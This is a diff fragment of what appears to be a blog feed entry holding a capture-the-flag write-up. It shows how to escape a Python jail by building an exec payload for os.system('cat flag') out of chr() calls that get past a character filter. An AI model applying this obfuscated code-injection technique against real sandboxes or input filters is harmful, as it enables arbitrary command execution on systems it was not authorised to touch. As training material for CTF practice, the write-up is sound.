@@ -29,7 +29,7 @@ By inputting some characters, we can identify few Illegal characters:
 []._&amp;#39;&amp;#34; But luckily () is allowed, looking at locals(), we can see exec() is allowed.
 exec() required string argument but unfortunately &#39;&amp;quot; were restricted. However, we found out that chr() is allowed, so let&amp;rsquo;s create our payload:
 Original payload:
-exec(&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag&amp;#39;)&amp;#34;&amp;#34;) Payload crafted to bypass restrictions:
+exec(&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag&amp;#39;)&amp;#34;) Payload crafted to bypass restrictions:
 exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)) Execute it and got the flag!
 Flag:</description>
     </item>
